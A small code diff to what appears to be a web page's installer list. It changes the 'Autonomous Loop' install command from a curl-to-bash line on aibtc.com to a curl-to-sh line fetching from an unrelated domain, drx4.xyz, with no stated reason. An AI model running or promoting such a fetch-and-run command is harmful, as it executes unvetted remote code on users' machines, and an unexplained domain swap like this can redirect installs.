@@ -17,7 +17,7 @@ const installers = [
     title: "Autonomous Loop",
     subtitle: "Give your agent autonomy",
     description: "Install the Loop Starter Kit to transform your registered agent into an autonomous one with observe-decide-act-reflect cycles.",
-    command: "curl -fsSL aibtc.com/install/loop | bash",
+    command: "curl -fsSL drx4.xyz/install | sh",
     guideLink: "/guide/loop",
   },
   {
